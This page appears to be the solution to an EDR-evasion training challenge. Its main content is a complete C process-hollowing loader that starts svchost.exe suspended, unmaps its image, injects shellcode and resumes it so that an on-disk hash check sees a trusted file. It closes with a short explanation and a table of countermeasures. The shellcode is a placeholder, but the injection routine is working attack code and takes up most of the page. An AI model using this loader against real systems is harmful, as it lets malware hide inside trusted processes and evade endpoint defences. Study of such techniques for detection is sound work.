---
title: "Solution 31: Process Hollowing vs Hash Check"
difficulty: hard
category: "Signature Bypass"
---

[Back to Challenge]({{ '/challenges/31-process-hollowing/' | relative_url }})

## Overview

Process hollowing replaces a legitimate process's memory with malicious code. The EDR hashes the on-disk image (still clean), so Rule 6 sees a trusted hash.

## Solution

```c
#include <windows.h>
#include <stdio.h>

// Simplified process hollowing — replaces code section of a
// suspended process with shellcode. The on-disk svchost.exe
// remains unchanged, so SHA256 hash check passes.

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);

int main() {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};

    // Step 1: Create legitimate process in suspended state
    if (!CreateProcessW(
        L"C:\\Windows\\System32\\svchost.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED, NULL, NULL, &si, &pi))
    {
        printf("CreateProcess failed: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Created suspended svchost.exe (PID %lu)\n", pi.dwProcessId);

    // Step 2: Get the image base from the PEB
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

    PVOID imageBase = NULL;
    #ifdef _WIN64
    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 16),
        &imageBase, sizeof(imageBase), NULL);
    #else
    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8),
        &imageBase, sizeof(imageBase), NULL);
    #endif

    // Step 3: Unmap the original image
    pNtUnmapViewOfSection NtUnmapViewOfSection =
        (pNtUnmapViewOfSection)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");

    NtUnmapViewOfSection(pi.hProcess, imageBase);
    printf("[+] Unmapped original image at %p\n", imageBase);

    // Step 4: Allocate memory and write payload
    PVOID remoteMem = VirtualAllocEx(pi.hProcess, imageBase,
        4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Example: MessageBox shellcode (replace with actual payload)
    unsigned char shellcode[] = {
        0xCC  // int3 — placeholder, replace with real payload
    };

    WriteProcessMemory(pi.hProcess, remoteMem,
        shellcode, sizeof(shellcode), NULL);

    // Step 5: Update entry point and resume
    #ifdef _WIN64
    ctx.Rcx = (DWORD64)remoteMem;
    #else
    ctx.Eax = (DWORD)remoteMem;
    #endif
    SetThreadContext(pi.hThread, &ctx);

    ResumeThread(pi.hThread);
    printf("[+] Resumed with hollowed code — EDR sees clean svchost.exe hash\n");

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}
```

## Why It Works

The EDR resolves `info.imagePath` via `QueryFullProcessImageNameW`, which returns the path of the **original on-disk file** (`C:\Windows\System32\svchost.exe`). The SHA256 of `svchost.exe` is a trusted system hash — it will never be in the malware signature database.

```
On disk:    svchost.exe  →  SHA256: abc123... (clean, not in signatures)
In memory:  [malicious shellcode]  →  never checked
```

## Countermeasures

| Defense | What It Does |
|---------|-------------|
| ETW-TI monitoring | Kernel sees `NtUnmapViewOfSection` + `NtWriteVirtualMemory` on remote process |
| Memory scanning | Hash or YARA-scan the process's actual memory pages |
| Call stack analysis | Detect `VirtualAllocEx` + `WriteProcessMemory` targeting a remote process |
| PPL protection | Protected processes cannot be hollowed by unprivileged code |
